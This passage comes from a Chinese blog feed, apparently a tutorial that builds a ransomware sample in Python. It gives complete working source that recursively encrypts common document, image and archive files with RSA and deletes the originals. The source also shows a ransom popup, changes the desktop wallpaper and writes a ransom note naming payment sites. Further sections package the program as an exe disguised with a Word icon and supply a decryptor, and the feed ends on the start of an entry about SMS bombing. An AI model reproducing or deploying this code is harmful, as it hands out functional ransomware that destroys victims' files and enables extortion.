生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;抱歉，你的电脑已经被我们控制，里面部分文件已经被加密，如果想要恢复，请及时联系我们~&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747068.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061747271.png" alt="image.png"> </p><h4 id="替换桌面壁纸"><a href="#替换桌面壁纸" class="headerlink" title="替换桌面壁纸"></a>替换桌面壁纸</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值为零。</span></span><br><span class="line">    <span class="comment"># 修改桌面背景</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置壁纸的路径</span></span><br><span class="line">image_path = os.getcwd()+<span class="string">&quot;\\background.jpg&quot;</span></span><br><span class="line"><span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数设置壁纸</span></span><br><span class="line">set_wallpaper(image_path)</span><br></pre></td></tr></table></figure><h4 id="生成勒索信"><a href="#生成勒索信" class="headerlink" title="生成勒索信"></a>生成勒索信</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件名</span></span><br><span class="line">file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要写入的内容</span></span><br><span class="line">content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line"><span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line"><span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line"><span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件的绝对路径</span></span><br><span class="line">file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;文件 &#x27;<span class="subst">&#123;file_name&#125;</span>&#x27; 已创建并写入内容，现在将打开该文件.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748593.png" alt="image.png"> </p><p>这块生成的勒索信是 txt 格式的。然而txt格式是在被加密文件类型中的。这块就会造成冲突。</p><p>所以，需要修改前面的加密函数，将 “extortion_Readme.txt” 从加密文件中排除</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061748290.png" alt="image.png"> </p><h3 id="代码打包成exe"><a href="#代码打包成exe" class="headerlink" title="代码打包成exe"></a>代码打包成exe</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>首先准备一个icon，用来对生成的exe伪装（这块使用word文档图标）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749131.png" alt="img"> </p><h4 id="pyinstaller将资源文件打包到exe中"><a href="#pyinstaller将资源文件打包到exe中" class="headerlink" title="pyinstaller将资源文件打包到exe中"></a>pyinstaller将资源文件打包到exe中</h4><p>（1）首先安装pyinstaller</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure><p>（2）将资源文件打包进exe文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./res/pubkey.pem;res&#x27; --add-data &#x27;./res/background.png;res&#x27; -i .\word.ico  -Fw .\encrypt.py</span><br></pre></td></tr></table></figure><ul><li>–add-data 加载资源文件</li><li>-i   加载图标文件</li><li>-F  加载脚本文件</li><li>w：执行文件时不显示控制台</li></ul><p>同时这块要注意，确保在打包时正确引用这些资源文件。在 Python 代码中，通常使用相对路径来访问这些文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061749643.png" alt="image.png"> </p><h4 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h4><p>打包好之后，突然想起来，生成的文件是exe格式的，那么也就需要将该文件排除在被勒索文件外：</p><p>当将Python脚本打包成可执行的exe文件后，获取自身文件名的传统方法（如使用sys.argv[0]）可能不再适用，因为打包后的exe文件可能不再直接通过Python解释器运行。</p><p>不过，可以使用os模块中的path函数来获取当前运行的exe文件的名称。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前运行的exe文件的路径</span></span><br><span class="line">exe_path = os.path.abspath(sys.executable)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件名</span></span><br><span class="line">exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前运行的exe文件名是：<span class="subst">&#123;exe_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>脚本文件代码修改为：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750433.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750355.png" alt="image.png"> </p><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061750849.png" alt="image.png"> </p><h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"><span class="keyword">import</span> win32gui, win32con</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 生产1024位公私钥并保存为.pem  先在本地生成，将生成的公钥和加密程序一起打包发送到受害者即可</span></span><br><span class="line"><span class="comment"># pub, priv = rsa.newkeys(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pub = pub.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/pubkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(pub)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># priv = priv.save_pkcs1()</span></span><br><span class="line"><span class="comment"># with open(f&quot;./keys/privkey.pem&quot;, mode=&quot;wb&quot;) as file:</span></span><br><span class="line"><span class="comment">#     file.write(priv)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#预定义想要加密的文件后缀名，可以自己选择</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">filename</span>):</span><br><span class="line">    pubkey_name = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;pubkey.pem&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> filename.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pubkey_name) <span class="keyword">as</span> file:  <span class="comment">#加载RSA公钥，准备加密</span></span><br><span class="line">            pub = file.read()</span><br><span class="line">            pub = rsa.PublicKey.load_pkcs1(pub)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 删除原始文件</span></span><br><span class="line">        os.remove(filename)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">117</span>):</span><br><span class="line">            res.append(rsa.encrypt(data[i:i + <span class="number">117</span>], pub))</span><br><span class="line">        byte_data = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line">        byte_data = base64.b64encode(byte_data).decode()</span><br><span class="line"> </span><br><span class="line">        filename = filename + <span class="string">&quot;.enc&quot;</span> <span class="comment">#加密后的文件后缀名改为.enc</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, mode=<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byte_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要作用就是列出文件夹下所有文件，实现全文件加密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            <span class="comment"># 定义排除加密的列表</span></span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">&quot;extortion_Readme.txt&quot;</span> <span class="keyword">or</span>  file_name == <span class="string">&quot;background.png&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> file_name == exe_name:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                encrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_encrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_encrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;Warnning!!!&quot;</span>, <span class="string">&quot;抱歉，你的电脑已经被我们控制，里面部分文件已经被加密，如果想要恢复，请及时联系我们~&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改桌面背景</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_wallpaper</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># SPI_SETDESKWALLPAPER = 20</span></span><br><span class="line">    <span class="comment"># SPIF_UPDATEINIFILE = 0x01</span></span><br><span class="line">    <span class="comment"># SPIF_SENDCHANGE = 0x02</span></span><br><span class="line">    <span class="comment"># 返回值：如果函数调用成功，返回值非零；如果函数调用失败，返回值为零。</span></span><br><span class="line">    <span class="comment"># 修改桌面背景</span></span><br><span class="line">    <span class="keyword">return</span> win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER,</span><br><span class="line">                                          image_path,</span><br><span class="line">                                          win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_letter</span>():</span><br><span class="line">    file_name = <span class="string">&quot;extortion_Readme.txt&quot;</span></span><br><span class="line">    <span class="comment"># 要写入的内容</span></span><br><span class="line">    content = <span class="string">&quot;---=== Welcome. Again ===---\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What Happen? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Your files are encrypted and currently unavailable. You can check it all files on the system do not open properly.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;By the way, everything is possible to recover(restore), but you need to follow our instructions. Otherwise, you can&#x27;t return your data (Never).\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] What guarantees? [+]&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Its just a business. We absolutely do not care you and your deals, except getting benefits. If we do not do our work and liabilities - \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;nobody will not cooperate with us, Its not in our interests.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;To check the ability of returning files, you should go to our website. there you can decrypt one file and free. That isi our guarantee.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the \n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;private key. In practice - time is much more valuable than money.\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;[+] How to get access on website? [+]\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;You have two ways:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;1) [Recommended] Using a Tor brower!\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Download and install Tor brower from this site: https://torproject.org\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) open our website: http://aplwbzo468w90726424023846238690283.coion/CE2937HFJJK\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;2) If Tor blocked in your country, try to use VPN! But you can use our secondary website. for this:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    a) Open your any brower (Chrome, Opera, IE, Edge)\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;    b) Open our secondary website: http://decryptor.cc/CE2937HFJJK\n\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Warnning secondary website can be blocked, thats why first variant much better and more available.\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;When you open our website, put the follow data in the input form:\n&quot;</span>\</span><br><span class="line">    <span class="string">&quot;Key:\n\r&quot;</span></span><br><span class="line">    <span class="comment"># 创建并写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取文件的绝对路径</span></span><br><span class="line">    file_path = os.path.abspath(file_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打开文件</span></span><br><span class="line">    os.startfile(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 获取当前运行的exe文件的路径</span></span><br><span class="line">    exe_path = os.path.abspath(sys.executable)</span><br><span class="line">    <span class="comment"># 获取文件名</span></span><br><span class="line">    exe_name = os.path.basename(exe_path)</span><br><span class="line"></span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line">    <span class="comment"># print(target_list)</span></span><br><span class="line">    encrypt(os.getcwd()) <span class="comment">#此处自定义想要加密的目录名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置壁纸的路径</span></span><br><span class="line">    image_path = resource_path(os.path.join(<span class="string">&quot;res&quot;</span>,<span class="string">&quot;background.png&quot;</span>))</span><br><span class="line">    <span class="comment"># print(image_path)</span></span><br><span class="line"></span><br><span class="line">    warnning()  <span class="comment"># 弹窗告警框</span></span><br><span class="line">    <span class="comment"># 调用函数设置壁纸</span></span><br><span class="line">    set_wallpaper(image_path)</span><br><span class="line">    <span class="comment"># 生成勒索信并打开</span></span><br><span class="line">    write_letter()</span><br></pre></td></tr></table></figure><h1 id="三、解密文件制作"><a href="#三、解密文件制作" class="headerlink" title="三、解密文件制作"></a>三、解密文件制作</h1><p>相对于加密文件，这个就简单的多了。分为下面几个步骤：</p><p>1、调用私钥解密当前文件夹下所有.enc后缀的文件</p><p>2、和上面类似，将资源文件private.pem同脚本文件打包成exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyinstaller --add-data &#x27;./des/privkey.pem;des&#x27; -Fw .\decrypt.py</span><br></pre></td></tr></table></figure><h3 id="解密代码如下"><a href="#解密代码如下" class="headerlink" title="解密代码如下"></a>解密代码如下</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#预定义想要解密的文件后缀名，可以自己选择</span></span><br><span class="line">target_list_str = <span class="string">&quot;.txt .lnk .pdf .jpg .png .jpeg .doc .docx .xls .xlsx .ppt .pptx .zip .exe&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成资源文件目录访问路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>): <span class="comment">#是否Bundle Resource</span></span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密过程，当然如果当为攻击程序肯定不能发送到被害者服务器，此处是为了防止误操作将自己文件加密后的还原（或者确保受害者无法浏览到此代码也可一起发送）</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">file_name</span>):</span><br><span class="line">    prikey_name = resource_path((os.path.join(<span class="string">&quot;des&quot;</span>,<span class="string">&quot;privkey.pem&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> file_name.split(<span class="string">&quot;.&quot;</span>)[-<span class="number">2</span>] <span class="keyword">in</span> target_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(prikey_name, mode=<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            priv = file.read()</span><br><span class="line">            priv = rsa.PrivateKey.load_pkcs1(priv)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            data = file.read()</span><br><span class="line"> </span><br><span class="line">        data = base64.b64decode(data.encode())</span><br><span class="line"> </span><br><span class="line">        res = []</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">128</span>):</span><br><span class="line">            temp_plaintext = rsa.decrypt(data[i:i + <span class="number">128</span>], priv)</span><br><span class="line">            res.append(temp_plaintext)</span><br><span class="line"> </span><br><span class="line">        last = <span class="string">b&#x27;&#x27;</span>.join(res)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#删除加密文件</span></span><br><span class="line">        os.remove(file_name)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_name.replace(<span class="string">&quot;.enc&quot;</span>, <span class="string">&quot;&quot;</span>), mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(last)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(file_path):</span><br><span class="line">        file_names = os.listdir(file_path)</span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">            file_name = os.path.join(file_path, file_name)</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(file_name):</span><br><span class="line">                decrypt(file_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rsa_decrypt(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rsa_decrypt(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成告警弹窗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warnning</span>():</span><br><span class="line">    <span class="comment"># 初始化Tkinter</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 隐藏主窗口</span></span><br><span class="line">    root.withdraw()</span><br><span class="line">    <span class="comment"># 弹出消息框</span></span><br><span class="line">    messagebox.showwarning(<span class="string">&quot;解密完成！！！&quot;</span>)</span><br><span class="line">    <span class="comment"># 关闭Tkinter</span></span><br><span class="line">    root.destroy()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> target_list_str.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        target_list.append(i.strip())</span><br><span class="line"></span><br><span class="line">    decrypt(os.getcwd())<span class="comment">#解密当前文件所在目录</span></span><br><span class="line">    warnning()</span><br></pre></td></tr></table></figure><h3 id="效果展示-1"><a href="#效果展示-1" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406061752237.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急样本 </tag>
            
            <tag> 勒索 </tag>
            
            <tag> pyinstaller </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过图片验证码实现短信轰炸</title>
      <link href="/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/"/>
      <url>/2024/06/01/%E7%BB%95%E8%BF%87%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8/</url>
      
